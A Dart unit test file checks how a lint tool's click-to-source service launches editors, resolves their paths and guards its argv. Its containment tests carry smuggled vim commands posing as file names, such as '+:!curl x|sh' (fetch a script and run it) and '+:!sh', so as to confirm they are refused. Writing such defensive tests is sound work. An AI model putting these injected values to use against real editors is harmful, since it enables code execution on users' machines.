// Copyright 2026 Ferrite Engineering LLC
// SPDX-License-Identifier: Apache-2.0

import 'dart:io';

import 'package:flutter_test/flutter_test.dart';
import 'package:lintcrux/domain/models/editor/editor_command.dart';
import 'package:lintcrux/domain/models/source_location.dart';
import 'package:lintcrux/services/editor/click_to_source_service.dart';

import '../../support/host_independent_editor_resolver.dart';
import '../../support/noop_process.dart';

class _FakeLauncher implements EditorLauncher {
  _FakeLauncher();
  List<
    ({
      String executable,
      List<String> arguments,
      Map<String, String>? environment,
    })
  >
  calls = [];
  ProcessException? throws;

  @override
  Future<Process> launch(
    String executable,
    List<String> arguments, {
    Map<String, String>? environment,
  }) async {
    calls.add(
      (
        executable: executable,
        arguments: arguments,
        environment: environment,
      ),
    );
    final ex = throws;
    if (ex != null) throw ex;
    // The service only awaits launch's return and discards it, so this hands
    // back a handle rather than spawning one. It used to spawn coreutils
    // `true`, which does not exist on Windows.
    return const NoopProcess();
  }
}

/// A resolver that never finds anything on `PATH` and never finds a
/// bundle CLI on disk, so `resolve` always returns the bare command
/// name. Keeps the PATH-agnostic tests deterministic on any host —
/// including the developer's own Mac where `code` may or may not be on
/// `PATH` and the VS Code bundle may or may not be installed, and the
/// Windows runner, where the real platform check would make a bare `code`
/// that nothing on `PATH` answers to a failed launch.
const MacOsBundleEditorResolver _noResolutionResolver =
    hostIndependentEditorResolver;
bool _neverExists(String _) => false;

void main() {
  group('ClickToSourceService', () {
    test('renders the editor command and forwards to the launcher', () async {
      final launcher = _FakeLauncher();
      final svc = ClickToSourceService(
        commandFor: () => EditorCommand.vsCode,
        launcher: launcher,
        resolver: _noResolutionResolver,
      );
      final result = await svc.openInEditor(
        const SourceLocation(file: '/x/a.sv', line: 12, column: 7),
      );
      expect(result.success, isTrue);
      expect(launcher.calls, hasLength(1));
      expect(launcher.calls.single.executable, 'code');
      expect(launcher.calls.single.arguments, ['-g', '/x/a.sv:12:7']);
    });

    test('reports failure when the launcher throws ProcessException', () async {
      final launcher = _FakeLauncher()
        ..throws = const ProcessException('code', [], 'No such file');
      final svc = ClickToSourceService(
        commandFor: () => EditorCommand.vsCode,
        launcher: launcher,
        resolver: _noResolutionResolver,
      );
      final result = await svc.openInEditor(
        const SourceLocation(file: '/x/a.sv', line: 1, column: 1),
      );
      expect(result.success, isFalse);
      expect(result.errorMessage, contains('Failed to launch code'));
    });

    test(
      'spawns the editor with the augmented PATH environment',
      () async {
        final launcher = _FakeLauncher();
        final svc = ClickToSourceService(
          commandFor: () => EditorCommand.vsCode,
          launcher: launcher,
          resolver: _noResolutionResolver,
        );
        await svc.openInEditor(
          const SourceLocation(file: '/x/a.sv', line: 1, column: 1),
        );
        expect(launcher.calls, hasLength(1));
        final env = launcher.calls.single.environment;
        // The spawn must carry an explicit environment (layered on top of
        // the inherited one) rather than `null` — that is what routes the
        // launch through `cleanEngineEnvironment`. The NO_COLOR / TERM
        // markers are the fingerprint of that helper.
        expect(env, isNotNull);
        expect(env!['NO_COLOR'], '1');
        expect(env['TERM'], 'dumb');
        if (Platform.isMacOS) {
          // The whole point of routing through `cleanEngineEnvironment` is
          // that the editor resolves against a PATH carrying Homebrew's bin
          // dirs, even under a Finder/Dock launch. The helper only *appends*
          // the Homebrew dirs when they are missing, so the effective PATH
          // the child sees is the env's PATH when set, otherwise the
          // inherited one — either way it must contain both dirs.
          final effectivePath =
              env['PATH'] ?? Platform.environment['PATH'] ?? '';
          expect(effectivePath, contains('/opt/homebrew/bin'));
          expect(effectivePath, contains('/usr/local/bin'));
        }
      },
    );

    test('uses the latest commandFor on each invocation', () async {
      var current = EditorCommand.vsCode;
      final launcher = _FakeLauncher();
      final svc = ClickToSourceService(
        commandFor: () => current,
        launcher: launcher,
        resolver: _noResolutionResolver,
      );
      await svc.openInEditor(
        const SourceLocation(file: '/x/a.sv', line: 1, column: 1),
      );
      current = EditorCommand.vim;
      await svc.openInEditor(
        const SourceLocation(file: '/x/a.sv', line: 1, column: 1),
      );
      expect(launcher.calls, hasLength(2));
      expect(launcher.calls[0].executable, 'code');
      expect(launcher.calls[1].executable, 'vim');
    });

    test(
      'falls back to the macOS app-bundle CLI when code is not on PATH',
      () async {
        const bundleCli =
            '/Applications/Visual Studio Code.app/Contents/Resources/app/bin/code';
        final launcher = _FakeLauncher();
        // Simulate a Mac where `code` is on no PATH dir (nothing under a
        // PATH entry exists) but the VS Code bundle IS installed: the only
        // path that "exists" is the in-bundle CLI.
        final svc = ClickToSourceService(
          commandFor: () => EditorCommand.vsCode,
          launcher: launcher,
          resolver: MacOsBundleEditorResolver(
            isMacOs: true,
            isWindows: false,
            fileExists: (path) => path == bundleCli,
          ),
        );
        final result = await svc.openInEditor(
          const SourceLocation(file: '/x/a.sv', line: 12, column: 7),
        );
        expect(result.success, isTrue);
        expect(launcher.calls, hasLength(1));
        // The bare `code` was rewritten to the absolute in-bundle CLI.
        expect(launcher.calls.single.executable, bundleCli);
        // Args are untouched — resolution only rewrites the executable.
        expect(launcher.calls.single.arguments, ['-g', '/x/a.sv:12:7']);
      },
    );

    test(
      'errors cleanly when neither PATH nor a known bundle resolves',
      () async {
        // Nothing exists anywhere and the (bare) spawn fails, exactly as
        // Process.start would when the command is truly unresolvable.
        final launcher = _FakeLauncher()
          ..throws = const ProcessException('code', [], 'No such file');
        final svc = ClickToSourceService(
          commandFor: () => EditorCommand.vsCode,
          launcher: launcher,
          resolver: const MacOsBundleEditorResolver(
            isMacOs: true,
            isWindows: false,
            fileExists: _neverExists,
          ),
        );
        final result = await svc.openInEditor(
          const SourceLocation(file: '/x/a.sv', line: 1, column: 1),
        );
        expect(result.success, isFalse);
        // Falls through to the bare name, so the failure names `code`.
        expect(launcher.calls.single.executable, 'code');
        expect(result.errorMessage, contains('Failed to launch code'));
      },
    );

    test('a code that IS on PATH wins over the bundle fallback', () async {
      const onPathCode = '/opt/homebrew/bin/code';
      const bundleCli =
          '/Applications/Visual Studio Code.app/Contents/Resources/app/bin/code';
      final launcher = _FakeLauncher();
      // Both the PATH copy and the bundle copy exist; PATH must win, so
      // the bare `code` is left for Process.start to resolve.
      final svc = ClickToSourceService(
        commandFor: () => EditorCommand.vsCode,
        launcher: launcher,
        resolver: MacOsBundleEditorResolver(
          isMacOs: true,
          isWindows: false,
          fileExists: (path) => path == onPathCode || path == bundleCli,
        ),
        // Pin the PATH so resolution does not depend on the host machine's
        // real PATH — `cleanEngineEnvironment()` injects /opt/homebrew/bin on
        // macOS but not on the Windows CI runner, which made this test pass
        // locally and fail on Windows.
        environmentBuilder: () => const {'PATH': '/opt/homebrew/bin'},
      );
      final result = await svc.openInEditor(
        const SourceLocation(file: '/x/a.sv', line: 1, column: 1),
      );
      expect(result.success, isTrue);
      expect(launcher.calls.single.executable, 'code');
    });
  });

  group('MacOsBundleEditorResolver', () {
    test('returns an explicit path (contains "/") verbatim', () {
      const resolver = MacOsBundleEditorResolver(
        isMacOs: true,
        isWindows: false,
        fileExists: _neverExists,
      );
      expect(
        resolver.resolve('/usr/local/bin/mytool', pathEnvironment: ''),
        '/usr/local/bin/mytool',
      );
    });

    test('does not consult the bundle map off macOS', () {
      const bundleCli =
          '/Applications/Visual Studio Code.app/Contents/Resources/app/bin/code';
      final resolver = MacOsBundleEditorResolver(
        isMacOs: false,
        isWindows: false,
        fileExists: (path) => path == bundleCli,
      );
      // Even though the bundle CLI "exists", a non-macOS host never uses
      // it — the bare name is returned for the platform's own resolution.
      expect(resolver.resolve('code', pathEnvironment: '/usr/bin'), 'code');
    });

    test('resolves subl, zed, and cursor bundle CLIs', () {
      String bundle(String name) => macOsEditorBundleClis[name]!;
      for (final name in const ['subl', 'zed', 'cursor']) {
        final resolver = MacOsBundleEditorResolver(
          isMacOs: true,
          isWindows: false,
          fileExists: (path) => path == bundle(name),
        );
        expect(
          resolver.resolve(name, pathEnvironment: '/usr/bin:/bin'),
          bundle(name),
        );
      }
    });

    test('unknown editor with no PATH hit returns the bare name', () {
      const resolver = MacOsBundleEditorResolver(
        isMacOs: true,
        isWindows: false,
        fileExists: _neverExists,
      );
      expect(
        resolver.resolve('helix', pathEnvironment: '/usr/bin'),
        'helix',
      );
    });

    // Windows CreateProcess searches the calling process's CWD ahead of
    // PATH, and LintCrux's CWD is the shell it was launched from — for a
    // developer, the repository being linted. The editor must be handed a
    // path, not a name, or a `code.exe` committed to that repository runs.
    test('resolves a bare editor to an absolute path on Windows', () {
      final resolver = MacOsBundleEditorResolver(
        isMacOs: false,
        isWindows: true,
        fileExists: <String>{r'C:\tools\bin\code.EXE'}.contains,
      );
      expect(
        resolver.resolve('code', pathEnvironment: r'C:\tools\bin'),
        r'C:\tools\bin\code.EXE',
      );
    });

    // Returning the bare name would let CreateProcess find a `code.exe` in
    // the launch folder for exactly the users who have no real one.
    test('on Windows an editor nothing on PATH answers to throws', () {
      const resolver = MacOsBundleEditorResolver(
        isMacOs: false,
        isWindows: true,
        fileExists: _neverExists,
      );
      expect(
        () => resolver.resolve('code', pathEnvironment: r'C:\tools\bin'),
        throwsA(isA<ProcessException>()),
      );
    });

    test(
      'openInEditor reports that as a failed launch and starts nothing',
      () async {
        final launcher = _FakeLauncher();
        final svc = ClickToSourceService(
          commandFor: () => EditorCommand.vsCode,
          launcher: launcher,
          resolver: const MacOsBundleEditorResolver(
            isMacOs: false,
            isWindows: true,
            fileExists: _neverExists,
          ),
          environmentBuilder: () => const {'PATH': r'C:\tools\bin'},
        );
        final result = await svc.openInEditor(
          const SourceLocation(file: r'C:\rtl\top.sv', line: 3, column: 1),
        );
        expect(result.success, isFalse);
        expect(result.errorMessage, contains('not found on PATH'));
        expect(launcher.calls, isEmpty);
      },
    );
  });

  // The last gate before a string the app did not author becomes argv.
  //
  // `SourceLocation.file` has two untrusted origins: an engine's stdout
  // (steered by a design file's `line` directive) and a CXP peer's
  // `request_open_source.filePath`, which arrives over a socket and is
  // wired straight to `openInEditor` in `cxp_server_provider.dart`. The
  // vim / emacs presets are `['+{line}', '{file}']`, and an argv element
  // starting with `+` is an editor *command*.
  group('argv containment', () {
    test('refuses a vim +command masquerading as a filename', () async {
      final launcher = _FakeLauncher();
      final svc = ClickToSourceService(
        commandFor: () => EditorCommand.vim,
        launcher: launcher,
        resolver: _noResolutionResolver,
      );
      final result = await svc.openInEditor(
        const SourceLocation(file: '+:!curl x|sh', line: 42, column: 1),
      );
      expect(result.success, isFalse);
      expect(launcher.calls, isEmpty, reason: 'nothing may be spawned');
      expect(result.errorMessage, contains('absolute file paths'));
    });

    test('refuses a relative path', () async {
      final launcher = _FakeLauncher();
      final svc = ClickToSourceService(
        commandFor: () => EditorCommand.vsCode,
        launcher: launcher,
        resolver: _noResolutionResolver,
      );
      final result = await svc.openInEditor(
        const SourceLocation(file: 'rtl/top.sv', line: 1, column: 1),
      );
      expect(result.success, isFalse);
      expect(launcher.calls, isEmpty);
    });

    test('still opens a Windows-absolute path', () async {
      final launcher = _FakeLauncher();
      final svc = ClickToSourceService(
        commandFor: () => EditorCommand.vsCode,
        launcher: launcher,
        resolver: _noResolutionResolver,
      );
      final result = await svc.openInEditor(
        const SourceLocation(file: r'C:\rtl\top.sv', line: 3, column: 4),
      );
      expect(result.success, isTrue);
      expect(launcher.calls, hasLength(1));
    });

    test(
      'a refusal still reports the attempt to telemetry as failed',
      () async {
        final seen = <({EditorPreset preset, bool ok})>[];
        final svc = ClickToSourceService(
          commandFor: () => EditorCommand.vim,
          launcher: _FakeLauncher(),
          resolver: _noResolutionResolver,
          onLaunched: (preset, {required ok}) =>
              seen.add((preset: preset, ok: ok)),
        );
        await svc.openInEditor(
          const SourceLocation(file: '+:!sh', line: 1, column: 1),
        );
        expect(seen, hasLength(1));
        expect(seen.single.ok, isFalse);
      },
    );
  });
}
